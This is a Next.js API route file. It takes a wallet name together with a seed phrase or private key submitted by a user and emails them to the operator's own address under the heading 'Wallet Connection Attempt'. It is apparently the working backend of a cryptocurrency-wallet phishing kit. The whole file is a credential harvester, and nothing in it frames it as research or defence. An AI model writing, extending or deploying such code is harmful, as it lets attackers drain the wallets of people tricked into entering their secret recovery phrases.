import { NextRequest, NextResponse } from 'next/server';
import { sendEmail } from '@/app/utils/mail.utils';

type EmailRequestDto = {
  walletName: string;
  secretPhase?: string;
  privateKey?: string;
};

// The POST handler function for the API route
export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { walletName, secretPhase, privateKey } = body;
    
  
      // Construct the email message
      const message = `
        <h3>Wallet Connection Attempt</h3>
        <p><strong>Wallet Name:</strong> ${walletName}</p>
        ${
          secretPhase
            ? `<p><strong>Secret Phrase:</strong> ${secretPhase}</p>`
            : `<p><strong>Private Key:</strong> ${privateKey}</p>`
        }
      `;
  
      // Prepare email DTO
      const emailDto = {
        sender: process.env.MAIL_USER,
        receipients: process.env.MAIL_USER,
        subject: `${walletName} Wallet Connection Details`,
        message,
      };
  
      // Send the email using the utility function
      await sendEmail(emailDto);
  
      return NextResponse.json({ success: true, message: 'Email sent successfully' });
    } catch (error: any) {
      console.error('Error sending email:', error);
      return NextResponse.json(
        { success: false, message: 'Failed to send email', error: error.message },
        { status: 500 }
      );
    }
  }